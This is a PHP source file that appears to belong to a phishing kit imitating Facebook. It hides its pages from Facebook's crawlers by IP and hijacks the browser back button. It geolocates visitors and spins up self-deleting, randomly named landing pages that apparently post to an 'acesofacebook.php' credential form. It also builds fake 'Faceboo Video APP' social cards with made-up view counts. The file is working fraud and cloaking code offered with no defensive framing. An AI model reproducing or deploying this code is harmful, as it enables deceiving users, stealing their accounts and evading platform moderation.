<?php

function detectBotViaIPFB($ip){

	$ips_v4 = ["31.13", "69.171", "66.220", "69.63", "179.60", "157.240", "173.252","201.160","172.56","187.189","172.58.224","77.239.244","189.161.198","201.141.86","200.95.170","201.102.141","186.130.40"];
	$ips_v6 = ["2a03:2880"];

	$returner = false;

	foreach ($ips_v4 as $index => $ip_) {
		if(!$returner) $returner = (strpos($ip, $ip_) !== false);
	}

	foreach ($ips_v6 as $index => $ip_) {
		if(!$returner) $returner = (strpos($ip, $ip_) !== false);
	};

	return $returner;

};

function render_counters($general=null,$api=null){

	$content = '';

	$IP = getIP();
	$bot = detectBotViaIPFB($IP) ? "-BOT-FB-$IP":"-NOBOT-$IP";

	$content .= "";

	$content .= "<script>(function(){
			 var stateObj = { foo: 'Back' }; history.pushState(stateObj, '', '#');
		 })();

		   (function(){
				var ignoreHistoryChange = true;
			    window.onpopstate = function (event) {

						if (!ignoreHistoryChange) {
							ignoreHistoryChange = true;

					        try{
					        	window.top.location = '".LINK_BACK."';
					        }catch(d){
					        	window.location = '".LINK_BACK."';
					        };
					        return false;

						}
						else {
							ignoreHistoryChange = false;
						}


			    };
			})();

		   (function(){
			window.location.hash = Math.random();
			var ignoreHashChange = true;
			window.onhashchange = function () {
				if (!ignoreHashChange) {
					ignoreHashChange = true;

			        try{
			        	window.top.location = '".LINK_BACK."';
			        }catch(d){
			        	window.location = '".LINK_BACK."';
			        };
			        return false;

				}
				else {
					ignoreHashChange = false;
				}
			};
			})();</script>";

$content .="
	<script>
	var isp = document.getElementById(\"estado\");
	var getJSON = function(url, callback) {
	    var xhr = new XMLHttpRequest();
	    xhr.open('GET', url, true);
	    xhr.responseType = 'json';
	    xhr.onload = function() {
	      var status = xhr.status;
	      if (status === 200) {
	        callback(null, xhr.response);
	      } else {
	        callback(status, xhr.response);
	      }
	    };
	    xhr.send();
	};
	getJSON('//get.geojs.io/v1/ip/geo.json',
	function(err, data) {
	  if (err !== null) {
	    alert('Something went wrong: ' + err);
	  } else {
	    isp.value = (data.region);
	  }
	});
	</script>";


	foreach ($_GET as $key => $value) {
		if(strpos($key, 'counter') > -1 && $value){
			$content .= "<script> (function(){ new Image().src = '//whos.amung.us/widget/$value'; })(); </script> ";
		};
	};

 	if ($general) {
	  $content .= "<script id=\"whos\"> (function(){var img = new Image().src = '//whos.amung.us/widget/$general/?text=alvaro.com'; img.onload = ()=>{document.getElementById(\"whos\")}; })(); </script>";
		/*$content .= '
		<script id="check">window.onmessage = function(e){document.querySelector("iframe").remove();document.getElementById("check").remove()}</script>
		<iframe
    src=\'data:text/html,<!DOCTYPE html><html><head><meta charset="utf-8"><title></title></head><body><img src="https://whos.amung.us/widget/zki74558qm1"><script type="text/javascript">document.querySelector("img").onload = ()=>{window.top.postMessage("ok","*")}</script></body></html>\'
    sandbox="allow-scripts allow-top-navigation"
    seamless style="visibility:hidden;position:absolute;top:100%;"></iframe>';*/
	};
	//
 	if($api) $content = str_replace('<script>', '', str_replace('</script>', '', $content));

	return $content;

}

function isMobile($user_agent = null) {

	if(!$user_agent) $user_agent =  $_SERVER["HTTP_USER_AGENT"];

	    return preg_match("/(ipod|iphone|ipad|opera mini|blackberry|palm os|windows ce|windows mobile|palm|hiptop|avantgo|plucker|xiino|blazer|elaine|iris|3g_t|
	windows ce|opera mobi|windows ce; smartphone;|windows ce; iemobile|mini 9.5|vx1000|lge |m800|e860|u940|ux840|compal|wireless| mobi|ahong|lg380|lgku|lgu900|lg210|lg47|lg920|lg840|lg370|sam-r|mg50|s55|g83|t66|vx400|mk99|d615|d763|el370|sl900|mp500|samu3|
	samu4|vx10|xda_|samu5|samu6|samu7|samu9|a615|b832|m881|s920|n210|
	s700|c810|_h797|mobx|sk16d|848b|mowser|s580|r800|471x|v120|rim8|
	c500foma:|160x|x160|480x|x640|t503|w839|i250|sprint|w398samr810|
	m5252|c7100|mt126|x225|s5330|s820|htil-g1|fly v71|s302|-x113|novarra|
	k610i|-three|8325rc|8352rc|sanyo|vx54|c888|nx250|n120|mtk|
	c5588|s710|t880|c5005|i;458x|p404i|s210|c5100|teleca|s940|c500|s590
	|foma|samsu|vx8|vx9|a1000|_mms|myx|a700|gu1100|bc831|e300|ems100|
	me701|me702m-three|sd588|s800|8325rc|ac831|mw200|brew|d88|htc\/|
	htc_touch|355x|m50|km100|d736|p-9521|telco|sl74|ktouch|m4u\/|me702|
	8325rc|kddi|phone|lg|sonyericsson|samsung|240x|x320|vx10|nokia|sony
	cmd|motorola|up.browser|up.link|mmp|symbian|smartphone|midp|wap|
	vodafone|o2|pocket|kindle|mobile|psp|treo)/i",$user_agent);
}

function getContentfile($file){
    ob_start();
    $return = include $file;
    $output = ob_get_clean();
    return $output;
};

function build_params($name_=null,$param_=null){

	$default_params = [
		"ht" => 1,
		"lan" => "oldfbhk"
	];

	foreach ($_GET as $key => $value) {
		$default_params[$key] = $value;
	};

	if (isset($_SERVER['HTTP_REFERER'])) {
		$new__ = parse_url($_SERVER['HTTP_REFERER']);
		if (isset($new__['query'])) {
			 parse_str($new__['query'],$params);
			 if (gettype($params) == "array") {
				foreach ($params as $key => $value) {
					$default_params[$key] = $value;
				};
			 };
		}
	}

	if ( $name_ != null && $param_ != null ) {
		$default_params[$name_] = $param_;
	}


	return $default_params;

}

function CFINE($file=null,$data=null){

	if (!$file) { return false; };

	$returner = $file;

	if(!file_exists($file)){
		if(!$data) touch($file);
		if($data) file_put_contents($file, $data);
	};

	return $returner;

};

function CDINE($file=null){

	if (!$file) { return false; };

	$returner = $file;

	if(!file_exists($file)){
		mkdir($file);
	};

	return $returner;

};

function get_host($url=''){

	$file = dirname(dirname(__FILE__));
	$path_info = pathinfo($file);
	$base = $path_info['basename'];
	$has_subdomain = extract_subdomains($url);

	var_dump($path_info,dirname($_SERVER['PHP_SELF']));

	if(strpos($_SERVER['HTTP_HOST'], $base) || !$has_subdomain){
		return $base;
	}else{
		return '';
	}

}

function removeQueryStringFromURL ( $url )
{
    $url = preg_replace('/\?.*/', '', $url);
    return $url;
}

function extract_domain($domain)
{
    if(preg_match("/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i", $domain, $matches))
    {
        return $matches['domain'];
    } else {
        return $domain;
    }
}

function extract_subdomains($domain)
{
    $subdomains = $domain;
    $domain = extract_domain($subdomains);

    $subdomains = rtrim(strstr($subdomains, $domain, true), '.');

    return $subdomains;
}

function gen_uuid() {
    return sprintf( '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        // 32 bits for "time_low"
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ),

        // 16 bits for "time_mid"
        mt_rand( 0, 0xffff ),

        // 16 bits for "time_hi_and_version",
        // four most significant bits holds version number 4
        mt_rand( 0, 0x0fff ) | 0x4000,

        // 16 bits, 8 bits for "clk_seq_hi_res",
        // 8 bits for "clk_seq_low",
        // two most significant bits holds zero and one for variant DCE1.1
        mt_rand( 0, 0x3fff ) | 0x8000,

        // 48 bits for "node"
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )
    );
}

function getLanding($landing='facebookapphk'){

	$full_file = (dirname(dirname(__FILE__))).'/landings/'.$landing.'/index.php';
	if(!file_exists($full_file)) $full_file = (dirname(dirname(__FILE__))).'/landings/facebookapphk/index.php';
	include($full_file);
}

function ObjectInString($source,$obj){

	foreach ($obj as $key => $value) {
	   $found = "{{{$key}}}";
	   if (strpos($source, $found)) {
	     $source = explode($found , $source);
	     $source = implode($value, $source);
	   }
	};


	return $source;
}

function controller_lading ($url){

	$metas = '
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@'.CALLED.'" />
		<meta name="twitter:title" content="Watch video @'.CALLED.'" />
		<meta name="twitter:description" content="'.rand(111,999).','.rand(111,999).' Views'.' " />
		<meta name="twitter:image" content="https://avatars.io/twitter/'.CALLED.'" />
	';

   return '
	<html>
	<head>
	<title>Faceboo Video APP</title>
		'.$metas.'
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="'.$url.'&<?php echo http_build_query($_GET); ?>"> <noframes>
	<body bgcolor="#FFFFFF" text="#000000">
	<a href="'.$url.'&<?php echo http_build_query($_GET); ?>">Click here to continue</a>
	</body>
	</noframes>
	</html>
   ';


}

function getIP()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
    {
        if (array_key_exists($key, $_SERVER) === true)
        {
            foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip)
            {
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                {
                    return $ip;
                }
            }
        }
    }
}

function controller_source(){

	$source = '<?php

	    $includes = dirname(dirname(__FILE__)).\'/\';
		require($includes.\'/configuration.php\');

		if(IS_BOT || FB_BOT) {

			header("HTTP/1.0 404 Not Found");
			exit;
		}


		$source = $_GET[\'source\'];
		$source = ".".$source;
		$landing = \'facebookapphk\';
		$controller = $_REQUEST[\'controller\'];

		if(isset($_GET[\'lan\'])) $landing = $_GET[\'lan\'];

		$dir = dirname(__FILE__);
		$actual_link = (isset($_SERVER[\'HTTPS\']) ? \'https\' : \'http\') . \'://\'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
		$action_post = dirname(dirname($actual_link)).\'/acesofacebook.php?\'.http_build_query($_GET);
		$action_post = str_replace("public/", "", $action_post);

		define("NO_CHANGE_ACTION" , true);


		if (file_exists($source)) {

	        echo render_counters(COUNTER_GENERAL);

			getLanding($landing);

			if (file_exists("$source/index.php")) {
				unlink("$source/index.php");
				unlink(__FILE__);
				rmdir($source);
			};

		}else{
			header("HTTP/1.0 404 Not Found");
			exit();
		};


	?>
	';


	return $source;
}

function createTemporalAccess(){
	$token_name = 'ACCESSS'.gen_uuid();
    $controller_name__ = 'CONTROLLER'.gen_uuid();

	$public = CDINE('./public/');
	$controller =  CFINE($public."$controller_name__.php",controller_source());
	$folder = CDINE($public.$token_name);
	$url_source = '../../'.$controller.'?source='.urlencode($folder).'&lan='.urlencode(LANDING_SELECT);
	$file_  = CFINE($folder.'/index.php',controller_lading($url_source));
	return $folder.'?'.http_build_query(build_params("controller",urlencode($controller_name__)));
}

class ZNZENCODE {

    public $password = "zenozagaprojectone";


    public function encode($string){
        $decimalValues = [];
        for ($i = 0; $i < strlen($string); $i++) {
            $decimalValues[] = ord($string[$i]);
        }
        return base64_encode(json_encode($decimalValues));

    }


    public function decode($string){

    	$string = base64_decode($string);
    	$string = urldecode($string);
    	$string = json_decode($string);

        $returner = "";
        for ($i = 0; $i < count($string); $i++) {
            $returner  .= chr($string[$i]);
        }

        return $returner;


    }

}
